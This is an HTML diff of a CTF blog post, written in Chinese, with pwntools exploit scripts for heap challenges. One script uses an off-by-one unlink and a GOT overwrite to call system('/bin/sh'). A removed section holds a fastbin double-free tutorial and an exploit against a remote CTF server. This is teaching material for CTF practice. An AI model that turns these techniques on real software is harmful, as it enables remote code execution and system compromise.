@@ -10,6 +10,12 @@
 
     <!--Description-->
     
+        <meta name="description" content="大佬们去打tctf了，pwn题没有人做，当时心里想的是至少也要扛起担子做个一题吧，然而现实是残酷的(:з」∠)没一题会做。。。。最后还是v爷爷回来秒掉一题，这两题是里面比较简单和普通的题，写篇博客记录一下
+
+1.Heap程序的关键点都在下面
+
+和普通的堆题相比，这里会连续生成两个相同大小的chunk">
+    
 
     <!--Author-->
     
@@ -18,7 +24,7 @@
 
     <!--Open Graph Title-->
     
-        <meta property="og:title" content="Aris&#39;Blog"/>
+        <meta property="og:title" content="suctf的两道pwn——Heap和Note"/>
     
 
     <!--Open Graph Description-->
@@ -29,7 +35,7 @@
 
     <!--Type page-->
     
-        <meta property="og:type" content="website" />
+        <meta property="og:type" content="article" />
     
 
     <!--Page Cover-->
@@ -40,7 +46,7 @@
 
     <!-- Title -->
     
-    <title>Aris&#39;Blog</title>
+    <title>suctf的两道pwn——Heap和Note - Aris&#39;Blog</title>
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
@@ -117,17 +123,14 @@
     <div class="logo">
         <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
         
-            <h1 id="main-title" class="title">Aris'Blog</h1>
-        
     </div>
 </header>
 
         <section class="main">
             
-                
 <div class="post">
 
-    <div class="post-header index">
+    <div class="post-header">
         <h1 class="title">
             <a href="/2018/06/03/suctf/">
                 suctf的两道pwn——Heap和Note
@@ -142,9 +145,13 @@
         </div>
     </div>
 
-    
-        <div class="content">
-            <blockquote>
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <blockquote>
 <p>大佬们去打tctf了，pwn题没有人做，当时心里想的是至少也要扛起担子做个一题吧，然而现实是残酷的<em>(:з」∠)</em>没一题会做。。。。最后还是v爷爷回来秒掉一题，这两题是里面比较简单和普通的题，写篇博客记录一下</p>
 </blockquote>
 <h2 id="1-Heap"><a href="#1-Heap" class="headerlink" title="1.Heap"></a>1.Heap</h2><p>程序的关键点都在下面</p>
@@ -155,98 +162,20 @@
 <p>下面是poc:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">local</span> = 1</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">local</span>:</span><br><span class="line">	cn = process(<span class="string">'./offbyone'</span>)</span><br><span class="line">	bin = ELF(<span class="string">'./offbyone'</span>)</span><br><span class="line">	libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def z(a=<span class="string">''</span>):</span><br><span class="line">	gdb.attach(cn,a)</span><br><span class="line">	<span class="keyword">if</span> a == <span class="string">''</span>:</span><br><span class="line">		raw_input()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(leng,con):</span><br><span class="line">	cn.sendline(<span class="string">'1'</span>)</span><br><span class="line">	cn.sendline(str(leng))</span><br><span class="line">	cn.sendline(con)</span><br><span class="line">	cn.recvuntil(<span class="string">'input your data'</span>)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">	cn.sendline(<span class="string">'2'</span>)</span><br><span class="line">	cn.sendline(str(idx))</span><br><span class="line">	cn.recvuntil(<span class="string">'input id'</span>)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">	cn.sendline(<span class="string">'3'</span>)</span><br><span class="line">	cn.sendline(str(idx))</span><br><span class="line">	cn.recvuntil(<span class="string">'input id'</span>)</span><br><span class="line"></span><br><span class="line">def edit(idx,con):</span><br><span class="line">	cn.sendline(<span class="string">'4'</span>)</span><br><span class="line">	cn.sendline(str(idx))</span><br><span class="line">	cn.sendline(con)</span><br><span class="line">	cn.recvuntil(<span class="string">'input your data'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chunk_list = 0x6020c0</span><br><span class="line">p3 = chunk_list + 3 * 8</span><br><span class="line"><span class="comment">#&gt;= 0x7f &lt;= 0x100</span></span><br><span class="line">add(0xa0,<span class="string">'/bin/sh\x00'</span>)<span class="comment">#0</span></span><br><span class="line">add(0xa0,<span class="string">'$0\x00'</span>)<span class="comment">#1</span></span><br><span class="line">add(0xa0,<span class="string">'a'</span> * 0x90)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(0xa0,<span class="string">'b'</span> * 0x90)<span class="comment">#3</span></span><br><span class="line">add(0xa0,<span class="string">'a'</span> * 0x90)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">dele(3)</span><br><span class="line"></span><br><span class="line">add(0xa8,<span class="string">'b'</span> * 0xa8)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">buf = p64(0) + p64(0xa0) + p64(p3 - 0x18) + p64(p3 - 0x10)</span><br><span class="line">buf = buf.ljust(0xa0,<span class="string">'x'</span>)</span><br><span class="line">buf+= p64(0xa0) + p64(0xb0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(3,buf)</span><br><span class="line"></span><br><span class="line">dele(4)</span><br><span class="line"></span><br><span class="line">show(3)</span><br><span class="line"></span><br><span class="line">sh_addr = u64(cn.recvuntil(<span class="string">'1:'</span>)[1:-2].ljust(8,<span class="string">'\x00'</span>))</span><br><span class="line">heap_addr = sh_addr - 0xe0</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'heap_addr:'</span> + hex(heap_addr))</span><br><span class="line"><span class="comment">#show(1)</span></span><br><span class="line">edit(3,p64(heap_addr + 0x30))</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line">libc_addr = u64(cn.recvuntil(<span class="string">'1:'</span>)[1:-2].ljust(8,<span class="string">'\x00'</span>)) - 88 - 0x3c4b20</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'libc_addr:'</span> + hex(libc_addr))</span><br><span class="line">edit(3,p64(bin.got[<span class="string">'free'</span>]))</span><br><span class="line">edit(0,p64(libc_addr + libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line">edit(3,p64(sh_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
 
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2018/03/30/强网杯部分pwn复现/">
-                强网杯部分pwn复现
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2018-03-30</span>
-            
-            
-            
-        </div>
     </div>
 
     
-        <div class="content">
-            <blockquote>
-<p>强网杯组织了下新生们一起报了个名，菜如我是一题都做不出来。。<br>不过当时部分题还是有点思路的，赛后学长给我们讲了一些，再参考着题解的情况下，再做了一遍其中的几题，新手向所以写得非常详细（应该会继续更新(然而鸽了</p>
-</blockquote>
-<h2 id="1-silent"><a href="#1-silent" class="headerlink" title="1.silent"></a>1.silent</h2><p>题如其名，打开跑一跑发现一点回显都没有,甩进IDA<br><img src="/img/强网杯部分pwn复现/main.png" alt="avatar"></p>
-<p>main的逻辑非常简单，分别点进去看看就能明白三个函数的作用</p>
-<p>如果你了解过堆的话应该不难看出漏洞所在，但如果你不了解，下面我们就来学习一下这题的背景知识——堆(堆的内容很多，这里只说到能解决此题的程度，我也正在学习中…..</p>
-<p>下面这张图是chunk的结构图，接下来请务必牢记它的构成<br><img src="/img/强网杯部分pwn复现/chunk.png" alt="avatar"><br>那么什么是chunk呢，我们都知道我们可以使用malloc申请一块内存区域，而malloc的返回值就是指向申请到的内存地址的指针。现在向上看那张图，看到那个mem区块了没有，malloc返回地址就是这个地方，也就是说我们用malloc申请得到了一个chunk。</p>
-<p>接下来我们看一下chunk的构成：</p>
-<p>prev_size：前一个未被使用的chunk的大小</p>
-<p>size:当前chunk的大小(为了防止内存碎片过多，得到的chunk大小一定是8的倍数，比如申请7字节mem也会得到8字节mem，8的倍数写成二进制是? x 1000即最后三位一定是0，设计者为了节约空间，将这3bit用来存储其他信息，这道题我们不需要知道这3bit的作用只做了解)</p>
-<p><br><br>在介绍fd和bk之前，先说一下malloc是如何管理内存的</p>
-<p>malloc维护了一系列链表，用来存放被free释放掉的chunk而不是直接还给系统，这样有利于加速下次使用。但如果链表里没有任何chunk，则会到一个叫top chunk的较大的chunk中分割一部分出来，如果top chunk也不够用的话则会调用mmap或者brk(皆为系统调用，只做了解)向系统申请</p>
-<p>而fd和bk就是malloc用来维护链表的工具——</p>
-<p>fd:下一个未被使用的chunk的地址</p>
-<p>bk:上一个未被使用的chunk的地址</p>
-<p><br><br>这也正是为什么fd和bk可以存在于mem而不是header的原因——既然用户已经free掉了chunk，那么chunk中的数据也就不再重要了，可以进行覆盖！</p>
-<p>就这样，fd和bk将所有释放掉的chunk连接起来形成了链表(被称为”bins”)，但这里要知道并不是所有释放掉的chunk都会连在一起</p>
-<p>这里我们只需要知道如果chunk的大小不大于0x80(mem &lt;= 64字节)的话，他就是一个fastbin</p>
-<p>fast体现在为了提高检索速度，fastbin只使用fd指针形成了一个单向链表，并且free这样的chunk时只在当前释放的chunk就是fastbin链表里的最后一个chunk时才会检测出异常并退出，即</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">free(a);</span><br><span class="line">free(a);//double free异常退出</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free(a);</span><br><span class="line">free(b);</span><br><span class="line">free(a);//正常运行</span><br></pre></td></tr></table></figure>
-<p>这就说明fastbin的安全系数很低，比较容易被利用</p>
-<p>这题所利用的漏洞就是这里，下面我们回到题目里<br><img src="/img/强网杯部分pwn复现/add.png" alt="avatar"><br><img src="/img/强网杯部分pwn复现/dele.png" alt="avatar"></p>
-<p>在delete()中我们可以free任何一个chunk无数次，只需要注意不连续free同一个chunk就行<br><br><br>所以我们可以free(a);free(b);free(a);之后再重新malloc一个和a,b大小一样的chunk，这样就会从fastbin链表里返回原本a所使用的空间。现在的情况是，你申请到了一个依旧存在在fastbin链表里的chunk，即mem块的前几个字节被当做fd使用，而你现在可以修改这里的值从而伪造一个chunk到fastbin中！<br><br><br>现在，不得不再提一个问题…malloc也是有安全检查的，并不是所有位置都可以被你拿来覆盖fd，你必须保证伪造的chunk的size是合法的，比如<br>malloc(0x20)返回一个size为0x30的chunk(0x10的头部,64位)那么你伪造的chunk的size范围就是0x30~0x37，所以要找到一个”\x00\x00\x00\x3?”的地方作为size才能成功得到这个chunk<br><br><br>接下来是思考如何get shell(应该也是最开始就思考过的)<br>观察到本题已经调用过system函数，而free函数的参数类型和system一致，所以考虑将free函数的got地址覆盖成system，然后执行到free的时候就会转而执行system函数(新手到此如果有疑惑，建议参考最后的代码用gdb多调试调试，都是这么过来的)<br><br><br>至此，此题的问题基本已经解决了，即通过double free构造一个伪造的chunk，利用这个chunk覆盖free()函数的got地址为system的plt地址，再执行’/bin/sh’(或者’$0’)get shell</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>,<span class="string">'-x'</span>,<span class="string">'bash'</span>,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">local</span> = 1</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">local</span>:</span><br><span class="line">	cn = process(<span class="string">'./silent'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	cn = remote(<span class="string">'39.107.32.132'</span>,10000)</span><br><span class="line">def z(a=<span class="string">''</span>):</span><br><span class="line">	gdb.attach(cn,a)</span><br><span class="line">	<span class="keyword">if</span> a == <span class="string">''</span>:</span><br><span class="line">		raw_input()</span><br><span class="line">def add(size,buf):</span><br><span class="line">	cn.sendline(<span class="string">'1'</span>)</span><br><span class="line">	cn.sendline(str(size))</span><br><span class="line">	cn.sendline(buf)</span><br><span class="line">def dele(num):</span><br><span class="line">	cn.sendline(<span class="string">'2'</span>)</span><br><span class="line">	cn.sendline(str(num))	</span><br><span class="line"></span><br><span class="line">add(0x50,<span class="string">'a'</span>)<span class="comment">#0</span></span><br><span class="line">add(0x50,<span class="string">'a'</span>)<span class="comment">#1</span></span><br><span class="line">dele(0)</span><br><span class="line">dele(1)</span><br><span class="line">dele(0)</span><br><span class="line">add(0x50,p64(0x601ffa))<span class="comment">#2</span></span><br><span class="line">add(0x50,<span class="string">'a'</span>)<span class="comment">#3</span></span><br><span class="line">add(0x50,<span class="string">'a'</span>)<span class="comment">#4</span></span><br><span class="line">add(0x50,<span class="string">'$0'</span> + <span class="string">'\x00'</span> * 0xc + p64(0x400730))<span class="comment">#5</span></span><br><span class="line">dele(5)</span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
-        </div>
+
+    
+
+    <!-- Comments -->
     
 
 </div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2018/03/27/hello-world/">
-                Hello World
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2018-03-27</span>
-            
-            
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p>Welcome to my new home!I’m going to start here.<br>Until the end of the Heavenly Kingdom,my conquest is the sea of stars.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Hello World!"</span>);</span><br><span class="line">	<span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="Chinese"><a href="#Chinese" class="headerlink" title="Chinese"></a>Chinese</h3><p>bin的懒新一个，跟风搭博客，因为是第一次搭，很多东西都不懂，功能应该会慢慢完善，望多关照！</p>
-<h3 id="Japanese"><a href="#Japanese" class="headerlink" title="Japanese"></a>Japanese</h3><p>俺はビンの新人です、<br>はじめまして、どうぞよろしくお願いいたします。</p>
-
-        </div>
-    
-
-</div>
-            
         </section>
+
     </div>
 </div>
-
-
-
-
 
 
 </div>
